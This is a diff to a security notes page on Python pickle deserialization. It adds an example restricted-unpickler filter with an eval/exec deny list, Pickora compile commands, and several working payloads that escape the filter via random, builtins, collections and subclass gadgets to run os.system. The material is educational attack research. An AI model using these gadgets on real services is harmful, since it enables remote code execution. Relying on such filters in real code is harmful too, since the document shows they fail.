@@ -645,6 +645,10 @@ print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8
 
 This method is called when the object is deserialized, and its return value will be what it turns into. But this return value is actually a function that will be called with the arguments provided. We can provide the function `os.system` after importing it, and as the first argument give it any command we want to run.&#x20;
 
+{% hint style="info" %}
+**Tip**: Using `exec` or `eval` instead of `os.system` can allow for more control over the actions your payload takes, as you can execute arbitrary Python code at the time of deserialization. Think of things like `raise` to return a readable exception message
+{% endhint %}
+
 ### Minimizing Payloads
 
 The above is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;
@@ -714,9 +718,125 @@ print(data)  # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05os\x94\x8c\
 
 #### Short commands
 
-Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In [the writeup](https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment#bash-tricks) linked above, I discover my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;
+Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In [the writeup](https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment#bash-tricks) linked above, I discovered my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;
 
 However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention"). This can be applied just as easily to this injection.&#x20;
+
+### Bypassing Filters
+
+[As explained in the documentation](https://docs.python.org/3/library/pickle.html#restricting-globals), a filter can be added to the deserialization process that restricts the objects that can be imported. This is normally possible through the [`GLOBAL`](https://github.com/python/cpython/blob/2ac1b48a044429d7a290310348b53a87b9f2033a/Lib/pickletools.py#L1926-L1939) opcode which takes a module and a class to load. This allows it to use methods from other modules and classes while deserializing, which is how it is able to deserialize any object.&#x20;
+
+As we have seen above, it allows an attacker to import dangerous modules such as `os` to run commands, or builtins like `exec` and `eval` to execute arbitrary Python code. The filter can define its own logic for importing modules and classes with an extension like the following:
+
+<pre class="language-python" data-title="Example filter"><code class="lang-python"><strong>ALLOWED_PICKLE_MODULES = ["random", "collections"]
+</strong><strong>UNSAFE_PICKLE_BUILTINS = ["eval", "exec"]
+</strong>
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if (
+            # Allow anything from the 'random' or 'collections' module
+<strong>            module in ALLOWED_PICKLE_MODULES
+</strong>            # From 'builtins', disallow 'eval' and 'exec', allow everything else
+<strong>            or module == "builtins" and name not in UNSAFE_PICKLE_BUILTINS
+</strong>        ):
+            return super().find_class(module, name)  # load it
+
+        raise pickle.UnpicklingError()  # raise exception if disallowed
+</code></pre>
+
+The above rules only allow classes from the `random` module to be imported and some dangerous built-ins are blocked. While it may seem safe at first, it turns out that there are a lot of possibilities still to bypass a configuration like this. Great research into this has been done by [@splitline](https://twitter.com/\_splitline\_) who ended up creating a tool that compiles Python-like code into serialized pickle data because the opcodes are quite powerful and allow defining some simple logic ([also check out the talk](https://www.youtube.com/watch?v=BAt8M2D77TQ\&t=1440s)):
+
+{% embed url="https://github.com/splitline/Pickora" %}
+Write pickle bytecode by scripting in Python with this compiler
+{% endembed %}
+
+The most important pieces of syntax that it can turn into pickle are the following:
+
+* Define variables with common types like `string`, `number`, `list`, `tuple` or `dict`
+* Attribute assignment like `dict_['x'] = 1337`
+* Function calls like `f(arg1, arg2)`
+* Import modules using `from module import something` syntax
+* Manually import more complex objects using `GLOBAL("module", "path.to.something")`
+
+The next section will use the Pickora syntax to easily create pickle data, which can be compiled like so:
+
+<pre class="language-bash"><code class="lang-bash"><strong>pickora -c 'from system import os; system("id")' -o output.pkl
+</strong># or from a source file:
+echo -e 'from system import os\nsystem("id")' > payload.py
+<strong>pickora payload.py -o output.pkl
+</strong># then test it using the pickle module:
+<strong>python -m pickle output.pkl
+</strong></code></pre>
+
+#### Bypassing Filters
+
+We will look at the example filter from above to bypass it in various general ways. \
+Firstly, while the allowed `random` module does not contain directly dangerous functions, it imports some modules like `import os as _os`. This is a property path that we can include in the `GLOBAL` opcode as the name of the class, separated by `.` dots. This way we can access the `os` module like before, but through the `random` module to bypass the filter:
+
+```python
+GLOBAL("random", "_os.system")("id")
+```
+
+Secondly, there is another module allowed named `builtins`. `exec` and `eval` are blocked, but more dangerous functions exist in the module like `__import__` to import `os` again. However, we cannot just access the `.system` function on it to run a command. This is not possible in pickle opcodes. Instead, we can call the `builtins.getattr` function as it is also not blocked, with the property we want to access on the `os` module:
+
+```python
+from builtins import getattr, __import__
+getattr(__import__("os"), "system")("id")
+```
+
+Thirdly, the seemingly insignificant `collections` module is also allowed to be imported from. One trick we can perform on any module is importing their `.__builtins__` attribute and calling `__getitem__` on it to recover a builtin like `eval`:
+
+```python
+eval = GLOBAL("collections", "__builtins__.__getitem__")('eval')
+eval("__import__('os').system('id')")
+```
+
+Lastly, if we weren't allowed to use the `builtins` module, or the `__builtins__` attribute, we can still use any module to recover the builtins. The clever trick is to temporarily save a value as an attribute on the module using `__setattr__`, to be able to access it later with another `GLOBAL` opcode. We can then import the `__getitem__` method on such a saved object and call it to access any dictionary key which normally wouldn't be possible in pickle opcodes. This combined with `__builtins__` allows us to get back to `eval` again:
+
+{% code title="Abuse any module" %}
+```python
+setattr = GLOBAL("random", "__setattr__")
+# Get to <class 'object'> using any property on the module
+subclasses = GLOBAL(
+    "random",
+    "BPF.__class__.__base__.__subclasses__"
+)()
+setattr("subclasses", subclasses)  # Save as attribute on the module
+
+# Access saved variable from the module and call __getitem__ method
+gadget = GLOBAL(
+    "random",
+    "subclasses.__getitem__"
+)(103)  # Need to get any <function> type
+setattr("gadget", gadget)  # Save this gadget to use later
+
+# Get the globals and then builtins from this gadget
+builtins = GLOBAL(
+    "random",
+    "gadget.__init__.__globals__.__getitem__"
+)('__builtins__')
+setattr("builtins", builtins)  # Save it for dictionary access
+
+# Access the final object to find __getitem__ on __builtins__ and call eval
+eval = GLOBAL(
+    "random",
+    "builtins.__getitem__"
+)('eval')
+eval("__import__('os').system('id')")
+```
+{% endcode %}
+
+{% hint style="info" %}
+**Note**: If you are able to import any _function_, you can significantly reduce the complexity of this bypass by accessing its globals and the `.get()` method, [like explained in this writeup](https://darkdrag0nite.medium.com/htb-cyber-apocalypse-2024-were-pickle-phreaks-revenge-f45933d3ee13)
+
+```python
+dict_get = GLOBAL("random", "choices.__globals__.__class__.get")
+globals = GLOBAL("random", "choices.__globals__")
+builtins = dict_get(globals, "__builtins__")
+eval = dict_get(builtins, "eval")
+eval("__import__('os').system('id')")
+```
+{% endhint %}
 
 ### Reverse Engineering
 
